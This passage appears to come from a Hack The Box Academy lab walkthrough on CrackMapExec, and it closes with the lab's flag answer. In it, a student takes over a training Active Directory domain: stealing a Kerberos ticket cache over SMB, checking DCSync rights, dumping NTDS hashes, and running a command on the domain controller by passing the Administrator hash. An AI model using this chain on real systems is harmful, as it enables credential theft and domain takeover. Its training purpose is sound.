(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u nick -p ASU934as0-dm23asd! --share Ccache --get-file 'svc_inlaneadm@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches' svc_inlaneadm.ccache

SMB         172.16.15.3     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.15.3     445    DC01             [+] INLANEFREIGHT.LOCAL\nick:ASU934as0-dm23asd! 
SMB         172.16.15.3     445    DC01             [*] Copy svc_inlaneadm@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches to svc_inlaneadm.ccache
SMB         172.16.15.3     445    DC01             [+] File svc_inlaneadm@INLANEFREIGHT.LOCAL_krbtgt~INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccaches was transferred to svc_inlaneadm.ccache
```

Next, students need to set the KRB5CCNAME environment variable to use the ccache file:

Code: shell

```shell
export KRB5CCNAME=$(pwd)/svc_inlaneadm.ccache
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ export KRB5CCNAME=$(pwd)/svc_inlaneadm.ccache
```

Additionally, students need to check users with DCSync privileges:

```shell
proxychains4 -q crackmapexec ldap dc01.inlanefreight.local -u Juliette -p Password1 -M daclread -o TARGET_DN="DC=inlanefreight,DC=local" ACTION=read RIGHTS=DCSync
```
```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec ldap dc01.inlanefreight.local -u Juliette -p Password1 -M daclread -o TARGET_DN="DC=inlanefreight,DC=local" ACTION=read RIGHTS=DCSync

SMB         dc01.inlanefreight.local 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.local 389    DC01             [+] INLANEFREIGHT.LOCAL\Juliette:Password1 
DACLREAD    dc01.inlanefreight.local 389    DC01             Be carefull, this module cannot read the DACLS recursively.
DACLREAD    dc01.inlanefreight.local 389    DC01             Target principal found in LDAP (DC=INLANEFREIGHT,DC=LOCAL)
[*]  ACE[15] info                
[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]    ACE flags                 : None
[*]    Access mask               : ControlAccess
[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*]    Trustee (SID)             : Domain Controllers (S-1-5-21-3514599724-1682172728-4136368490-516)
[*]  ACE[16] info                
[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]    ACE flags                 : None
[*]    Access mask               : ControlAccess
[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*]    Trustee (SID)             : svc_inlaneadm (S-1-5-21-3514599724-1682172728-4136368490-4642)
[*]  ACE[29] info                
[*]    ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]    ACE flags                 : None
[*]    Access mask               : ControlAccess
[*]    Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]    Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
[*]    Trustee (SID)             : Administrators (S-1-5-32-544)
```

Leading to a complete dump the NTDS secrets:

```shell
proxychains4 -q crackmapexec smb dc01.inlanefreight.local --use-kcache --ntds --user administrator
```
```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb dc01.inlanefreight.local --use-kcache --ntds --user administrator

SMB         dc01.inlanefreight.local 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         dc01.inlanefreight.local 445    DC01             [+] INLANEFREIGHT.LOCAL\svc_inlaneadm from ccache 
SMB         dc01.inlanefreight.local 445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         dc01.inlanefreight.local 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc01.inlanefreight.local 445    DC01             INLANEFREIGHT.LOCAL\Administrator:500:aad3b435b51404eeaad3b435b51404ee:935f8a2f4fc9ec7b45c54a1044c74c08:::
SMB         dc01.inlanefreight.local 445    DC01             [+] Dumped 1 NTDS hashes to /home/htb-ac594497/.cme/logs/DC01_dc01.inlanefreight.local_2023-01-18_162514.ntds of which 1 were added to the database
SMB         dc01.inlanefreight.local 445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         dc01.inlanefreight.local 445    DC01             [*] cat /home/htb-ac594497/.cme/logs/DC01_dc01.inlanefreight.local_2023-01-18_162514.ntds | grep -iv disabled | cut -d ':' -f1
```

At last, students can authenticate as the domain administrator, passing the hash to read the flag:

```shell
proxychains4 -q crackmapexec smb dc01.inlanefreight.local -u Administrator -H 935f8a2f4fc9ec7b45c54a1044c74c08 -x "more c:\users\administrator\desktop\flag.txt"
```
```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-vrusmlzx7j]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb dc01.inlanefreight.local -u Administrator -H 935f8a2f4fc9ec7b45c54a1044c74c08 -x "more c:\users\administrator\desktop\flag.txt"
SMB         dc01.inlanefreight.local 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         dc01.inlanefreight.local 445    DC01             [+] INLANEFREIGHT.LOCAL\Administrator:935f8a2f4fc9ec7b45c54a1044c74c08 (Pwn3d!)
SMB         dc01.inlanefreight.local 445    DC01             [+] Executed command 
SMB         dc01.inlanefreight.local 445    DC01             CME_R00cK$
```

The flag reads `CME_R00cK$`.

Answer: `CME_R00cK$`